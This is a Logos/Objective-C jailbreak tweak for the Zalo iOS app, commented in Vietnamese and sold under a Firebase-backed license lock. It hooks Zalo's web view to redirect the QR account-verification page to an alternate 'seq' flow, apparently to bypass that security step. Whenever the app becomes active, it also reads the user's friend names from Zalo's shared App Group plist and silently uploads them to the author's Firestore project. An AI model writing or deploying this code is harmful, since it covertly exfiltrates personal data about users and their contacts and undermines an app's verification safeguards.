/**
 * ==============================================================================
 * TWEAK CLANGG - ZALO SEQ REDIRECT & TỰ ĐỘNG LẤY LIST BẠN BÈ ĐỒNG BỘ VỀ WEB
 * Tác giả: clang | Version: 1.0.8
 * ==============================================================================
 * Tính năng chính:
 * 1. Chuyển hướng xác minh QR sang SEQ (Xác thực bạn bè).
 * 2. Bảo mật Cloud DRM (Khóa 1 SĐT = 1 iPhone, kiểm tra hạn dùng, chống lùi giờ).
 * 3. TỰ ĐỘNG TRÍCH XUẤT LIST BẠN BÈ: Ngay khi đăng nhập Zalo thành công (hoặc mở app),
 *    tweak tự động đọc danh bạ bạn bè từ App Group và đẩy thẳng lên Firebase Web.
 * ==============================================================================
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <Foundation/Foundation.h>

static NSString *const kFirebaseProjectId = @"seq-qr";

// Prototype declarations
static void _check_and_bind_device(
    NSURL *url, 
    NSString *phone, 
    NSString *currentUUID, 
    NSString *savedUUID, 
    NSString *status, 
    NSString *userId, 
    void (^onVerified)(void)
);

static void autoSyncFriendsToFirebase(NSString *phoneStr);

// Lấy Device UUID phần cứng iPhone
static inline NSString *getDeviceUUID(void) {
    return [[[UIDevice currentDevice] identifierForVendor] UUIDString];
}

// Lấy thời gian chuẩn từ Header HTTP Date của Server Firebase
static inline NSDate *getServerDate(NSHTTPURLResponse *httpResp) {
    NSString *dateHeader = httpResp.allHeaderFields[@"Date"] ?: httpResp.allHeaderFields[@"date"];
    if (dateHeader) {
        NSDateFormatter *df = [[NSDateFormatter alloc] init];
        df.locale = [[NSLocale alloc] initWithLocaleIdentifier:@"en_US_POSIX"];
        df.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"GMT"];
        df.dateFormat = @"EEE, dd MMM yyyy HH:mm:ss z";
        NSDate *sDate = [df dateFromString:dateHeader];
        if (sDate) return sDate;
    }
    return [NSDate date];
}

// Hiển thị thông báo UIAlertController trực tiếp trên màn hình Zalo
static void showSecurityAlert(NSString *title, NSString *message) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIViewController *rootVC = nil;
        UIWindow *targetWindow = nil;

        if (@available(iOS 13.0, *)) {
            for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
                if (scene.activationState == UISceneActivationStateForegroundActive) {
                    for (UIWindow *w in scene.windows) {
                        if (w.isKeyWindow) { targetWindow = w; break; }
                    }
                }
            }
        }

        if (!targetWindow) {
            #pragma clang diagnostic push
            #pragma clang diagnostic ignored "-Wdeprecated-declarations"
            targetWindow = [UIApplication sharedApplication].keyWindow;
            #pragma clang diagnostic pop
        }

        if (targetWindow) {
            rootVC = targetWindow.rootViewController;
            while (rootVC.presentedViewController) {
                rootVC = rootVC.presentedViewController;
            }
        }

        if (rootVC) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
                                                                           message:message
                                                                    preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"Đóng" style:UIAlertActionStyleCancel handler:nil]];
            [rootVC presentViewController:alert animated:YES completion:nil];
        }
    });
}

static void _check_and_bind_device(
    NSURL *url, 
    NSString *phone, 
    NSString *currentUUID, 
    NSString *savedUUID, 
    NSString *status, 
    NSString *userId, 
    void (^onVerified)(void)
) {
    if (!savedUUID || savedUUID.length == 0 || [savedUUID isEqualToString:@"null"]) {
        NSMutableURLRequest *pReq = [NSMutableURLRequest requestWithURL:url];
        [pReq setHTTPMethod:@"PATCH"];
        [pReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        NSDictionary *body = @{
            @"fields": @{
                @"phone": @{ @"stringValue": phone },
                @"device_id": @{ @"stringValue": currentUUID },
                @"user_id": @{ @"stringValue": userId ?: @"" },
                @"status": @{ @"stringValue": status ?: @"active" }
            }
        };
        [pReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]];
        [[[NSURLSession sharedSession] dataTaskWithRequest:pReq] resume];

        if (onVerified) onVerified();
    } else if ([savedUUID isEqualToString:currentUUID]) {
        if (onVerified) onVerified();
    } else {
        showSecurityAlert(@"Vi Phạm Bản Quyền", @"SĐT này đã được kích hoạt trên 1 iPhone khác! Không thể dùng chung.");
    }
}

// Logic kiểm tra bản quyền Cloud Firebase & Khóa cứng 1 thiết bị
static void verifyPhoneAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
    if (!phoneStr || phoneStr.length < 9) {
        showSecurityAlert(@"Bản Quyền clangg", @"Không tìm thấy số điện thoại hợp lệ để xác thực!");
        return;
    }

    NSString *cleanPhone = [[phoneStr componentsSeparatedByCharactersInSet:
        [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
    if ([cleanPhone hasPrefix:@"84"] && cleanPhone.length >= 10) {
        cleanPhone = [@"0" stringByAppendingString:[cleanPhone substringFromIndex:2]];
    }

    NSString *deviceUUID = getDeviceUUID();
    NSString *urlStr = [NSString stringWithFormat:
        @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/allowed_phones/%@",
        kFirebaseProjectId, cleanPhone];

    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url 
                                                       cachePolicy:NSURLRequestReloadIgnoringLocalCacheData 
                                                   timeoutInterval:6.0];
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req 
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (error || !data) {
                showSecurityAlert(@"Lỗi Bản Quyền", @"Không thể kết nối đến máy chủ xác thực Firebase!");
                return;
            }

            NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)response;
            if (httpResp.statusCode == 404) {
                showSecurityAlert(@"Chưa Kích Hoạt", [NSString stringWithFormat:@"Số %@ chưa được đăng ký bản quyền trên hệ thống!", cleanPhone]);
                return;
            }

            NSDate *serverTime = getServerDate(httpResp);
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            NSDictionary *fields = json[@"fields"];
            if (!fields) {
                showSecurityAlert(@"Lỗi Bản Quyền", @"Dữ liệu xác thực không hợp lệ!");
                return;
            }

            NSString *status = fields[@"status"][@"stringValue"] ?: @"active";
            NSString *userId = fields[@"user_id"][@"stringValue"] ?: @"";
            NSString *savedDeviceId = fields[@"device_id"][@"stringValue"];

            if ([status isEqualToString:@"blocked"]) {
                showSecurityAlert(@"Bị Khóa", @"Số điện thoại này đã bị khóa bản quyền từ xa!");
                return;
            }

            if (userId.length > 0) {
                NSString *uUrlStr = [NSString stringWithFormat:
                    @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/users/%@",
                    kFirebaseProjectId, userId];
                NSMutableURLRequest *uReq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:uUrlStr]
                                                                    cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                                                timeoutInterval:6.0];
                
                NSURLSessionDataTask *uTask = [[NSURLSession sharedSession] dataTaskWithRequest:uReq
                    completionHandler:^(NSData *uData, NSURLResponse *uResp, NSError *uErr) {
                        if (!uErr && uData) {
                            NSDictionary *uJson = [NSJSONSerialization JSONObjectWithData:uData options:0 error:nil];
                            NSDictionary *uFields = uJson[@"fields"];
                            if (uFields) {
                                NSString *uStatus = uFields[@"status"][@"stringValue"] ?: @"active";
                                NSString *uExpiry = uFields[@"expiry"][@"stringValue"] ?: @"lifetime";

                                if ([uStatus isEqualToString:@"blocked"]) {
                                    showSecurityAlert(@"Tài Khoản Bị Khóa", @"Tài khoản Khách Hàng này đang bị khóa toàn bộ!");
                                    return;
                                }

                                if (![uExpiry isEqualToString:@"lifetime"]) {
                                    NSDateFormatter *df = [[NSDateFormatter alloc] init];
                                    [df setDateFormat:@"yyyy-MM-dd"];
                                    [df setTimeZone:[NSTimeZone timeZoneWithAbbreviation:@"GMT"]];
                                    NSDate *expDate = [df dateFromString:uExpiry];
                                    if (expDate && [serverTime compare:expDate] == NSOrderedDescending) {
                                        showSecurityAlert(@"Hết Hạn", @"Gói dịch vụ của tài khoản này đã HẾT HẠN!");
                                        return;
                                    }
                                }
                            }
                        }

                        _check_and_bind_device(url, cleanPhone, deviceUUID, savedDeviceId, status, userId, onVerified);
                    }];
                [uTask resume];
                return;
            }

            _check_and_bind_device(url, cleanPhone, deviceUUID, savedDeviceId, status, userId, onVerified);
        }];
    [task resume];
}

// ==============================================================================
// TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐẨY LÊN FIREBASE WEB
// ==============================================================================

static void autoSyncFriendsToFirebase(NSString *phoneStr) {
    if (!phoneStr || phoneStr.length < 9) return;

    NSString *cleanPhone = [[phoneStr componentsSeparatedByCharactersInSet:
        [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
    if ([cleanPhone hasPrefix:@"84"] && cleanPhone.length >= 10) {
        cleanPhone = [@"0" stringByAppendingString:[cleanPhone substringFromIndex:2]];
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        // Tìm đường dẫn App Group zfriends
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
        NSString *plistPath = nil;
        if (groupURL) {
            plistPath = [[groupURL path] stringByAppendingPathComponent:@"Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
        }

        if (!plistPath || ![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
            // Thử đường dẫn mặc định
            plistPath = @"/var/mobile/Containers/Shared/AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist";
        }

        if (![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) return;

        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plistPath];
        if (!dict || dict.count == 0) return;

        NSMutableArray<NSString *> *friendNames = [NSMutableArray array];

        for (id key in dict) {
            id val = dict[key];
            if ([val isKindOfClass:[NSData class]]) {
                @try {
                    #pragma clang diagnostic push
                    #pragma clang diagnostic ignored "-Wdeprecated-declarations"
                    NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:val options:0 format:NULL error:nil];
                    #pragma clang diagnostic pop
                    NSArray *objs = inner[@"$objects"];
                    if (objs && objs.count >= 2) {
                        for (id obj in objs) {
                            if ([obj isKindOfClass:[NSString class]] && [obj length] >= 2) {
                                NSString *s = (NSString *)obj;
                                if (![s hasPrefix:@"$"] && ![s hasPrefix:@"http"] && ![s isEqualToString:@"ZSDFriendEntity"] && ![s isEqualToString:@"NSObject"]) {
                                    if (![friendNames containsObject:s] && friendNames.count < 500) {
                                        [friendNames addObject:s];
                                        break;
                                    }
                                }
                            }
                        }
                    }
                } @catch (NSException *e) {}
            }
        }

        if (friendNames.count == 0) return;

        // Tạo chuỗi tóm tắt mẫu
        NSArray *samples = [friendNames subarrayWithRange:NSMakeRange(0, MIN(8, friendNames.count))];
        NSString *sampleStr = [samples componentsJoinedByString:@", "];
        if (friendNames.count > 8) {
            sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
        }

        // Đẩy lên Firestore Web Admin
        NSString *postUrlStr = [NSString stringWithFormat:
            @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/friend_databases/%@",
            kFirebaseProjectId, cleanPhone];
        
        NSURL *postUrl = [NSURL URLWithString:postUrlStr];
        NSMutableURLRequest *postReq = [NSMutableURLRequest requestWithURL:postUrl];
        [postReq setHTTPMethod:@"PATCH"];
        [postReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

        NSDictionary *postBody = @{
            @"fields": @{
                @"phone": @{ @"stringValue": cleanPhone },
                @"total_friends": @{ @"integerValue": @(friendNames.count) },
                @"sample_friends": @{ @"stringValue": sampleStr },
                @"updated_at": @{ @"stringValue": @"now" }
            }
        };

        [postReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:postBody options:0 error:nil]];
        [[[NSURLSession sharedSession] dataTaskWithRequest:postReq] resume];
    });
}

// ==============================================================================
// HOOK ZALO WEBVIEW & TỰ ĐỘNG CHUYỂN HƯỚNG + ĐỒNG BỘ BẠN BÈ
// ==============================================================================

%hook WKWebView

- (WKNavigation *)loadRequest:(NSURLRequest *)request {
    NSURL *url = request.URL;
    NSString *host = url.host;
    NSString *path = url.path;

    if ([host containsString:@"accounts.zalo.me"] || [host containsString:@"zm-verification-center.zaloapp.com"]) {
        if ([path containsString:@"/verify/v3/qr"] || [path containsString:@"/verify/v3"]) {
            NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
            NSString *phoneParam = nil;
            for (NSURLQueryItem *item in components.queryItems) {
                if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
                    phoneParam = item.value;
                    break;
                }
            }

            if (phoneParam && phoneParam.length >= 9) {
                // Tự động kích hoạt đồng bộ danh bạ bạn bè về Web
                autoSyncFriendsToFirebase(phoneParam);

                verifyPhoneAndExecute(phoneParam, ^{
                    dispatch_async(dispatch_get_main_queue(), ^{
                        NSString *seqUrlStr = [url.absoluteString stringByReplacingOccurrencesOfString:@"/verify/v3/qr" withString:@"/verify/v3/seq"];
                        NSURL *seqUrl = [NSURL URLWithString:seqUrlStr];
                        NSMutableURLRequest *newReq = [request mutableCopy];
                        [newReq setURL:seqUrl];
                        [self loadRequest:newReq];
                    });
                });
                return nil;
            }
        }
    }

    return %orig(request);
}

%end

// Tự động kiểm tra đồng bộ bạn bè khi Zalo hoàn tất đăng nhập
%hook UIApplication

- (void)applicationDidBecomeActive:(UIApplication *)application {
    %orig;
    // Kiểm tra và đồng bộ bạn bè chạy ngầm
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
        NSString *savedPhone = [defs stringForKey:@"kZaloLastPhone"] ?: [defs stringForKey:@"phone"];
        if (savedPhone) {
            autoSyncFriendsToFirebase(savedPhone);
        }
    });
}

%end
